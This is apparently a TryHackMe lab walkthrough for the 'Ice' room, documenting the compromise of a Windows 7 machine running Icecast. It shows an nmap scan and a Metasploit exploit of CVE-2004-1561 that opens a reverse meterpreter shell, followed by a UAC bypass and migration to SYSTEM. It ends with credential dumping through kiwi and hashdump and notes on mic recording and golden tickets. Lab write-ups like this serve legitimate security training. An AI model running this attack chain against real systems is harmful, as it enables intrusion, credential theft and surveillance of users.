---
title: 'Ice - TryHackMe Walkthrough'
date: 2020-07-20 00:00:00
featured_image: '/images/posts/ice-thm-featured.png'
excerpt: Exploit a poorly configured Windows based media server and escalate the privileges to administrator.
---
![](/images/posts/ice-thm.png)

### Goal
Hack into a Windows machine, exploiting a very poorly secured media server.

### Recon
Lets run `nmap` on the victim to find the running services and open ports.

```bash
$ nmap -sV -p- 10.10.88.122
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http               Icecast streaming media server
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
From above we can see:  
3389 is open, typically used for RDP service.  
8000 is open and running Icecast media server.   
Operating System: Windows and  
Host name: DARK-PC.  

### Gain Access
The victim is running a *Icecast Media server* which has a known vulnerability [CVE-2004-1561](https://www.cvedetails.com/cve/CVE-2004-1561) and is of type **Execute Code Overflow vulnerability**.

Using this vulnerability exploit the victim and with `metasploit` to gain the remote shell.

```bash
msf5 > search icecast

Matching Modules================
   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


msf5 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/icecast_header) > show options
Module options (exploit/windows/http/icecast_header):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.76     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/icecast_header) > set RHOSTS 10.10.88.122
RHOSTS => 10.10.88.122
msf5 exploit(windows/http/icecast_header) >
msf5 exploit(windows/http/icecast_header) > set LHOST 10.2.18.4
LHOST => 10.2.18.4
msf5 exploit(windows/http/icecast_header) > exploit

[*] Started reverse TCP handler on 10.2.18.4:4444
[*] Sending stage (176195 bytes) to 10.10.88.122[*] Meterpreter session 1 opened (10.2.18.4:4444 -> 10.10.88.122:49646) at 2020-07-20 20:14:25 -0400

meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > shell
Process 2916 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>whoami
whoami
dark-pc\dark
```

We have successfully  exploited the victim and gained a meterpreter shell with the user *dark-pc\dark*.  
The remote machine is running on Windows 7 - Build 7601 and of 64-Bit architecture.

### Escalate the privileges

By running a local exploit suggester on meterpreter, it suggested the victim is vulnerable to nine known vulnerabilities.

```bash
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.88.122 - Collecting local exploits for x86/windows...
[*] 10.10.88.122 - 34 exploit checks are being tried...
[+] 10.10.88.122 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.88.122 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.88.122 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.88.122 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.88.122 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.88.122 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.88.122 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.88.122 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.88.122 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
From the results, the `exploit/windows/local/bypassuac_eventvwr` can be used to bypass the Windows UAC to esalate the privileges.

Background the current session and note down the current session number by `sessions`.
Load the exploit and set the LHOST and SESSION number that was recorded above.

```bash
msf5> use exploit/windows/local/bypassuac_eventvwr
msf5 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                  yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.2.18.4        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf5 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
SESSION => 1
msf5 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 10.2.18.4:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (176195 bytes) to 10.10.88.122
[*] Meterpreter session 2 opened (10.2.18.4:4444 -> 10.10.88.122:49748) at 2020-07-20 20:31:18 -0400
[*] Cleaning up registry keys ...
```
The exploit ran successfully and we can see the privileges by running `getprivs`.

```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter >
```
- Using the `SeTakeOwnershipPrivilege`, we can take the ownership of the files.  
- We need to migrate our process to a stable and equally privileged, in order to access the `lsass` service (which is responsible for authentication).
- List the running processes and migration to printer service.   

```bash
meterpreter > ps
 1256  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
meterpreter > migrate 1256

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
***We now have the super user privileges.***

### Looting Credentials

Using the `kiwi` extension into the meterpreter, lets extract the passwords with `creds_all`.

```bash
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)

```
We have successfully extracted the credentials and the user `Dark` password is `Password01!`.  

### Post Exploitation  
- Using the `hashdump` we can dump the password hashes.  

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
- Using `screenshare`, we can watch the remote user desktop.
- Using `record_mic`, we can record from the microphone.  
- Using `timestomp`, we can alter the modify the timestamps.  
- Using `golden_ticket_create`, we can create a golden kerberos ticket.  

Image Credits: [TryHackMe and the room creator](https://tryhackme.com/room/ice).
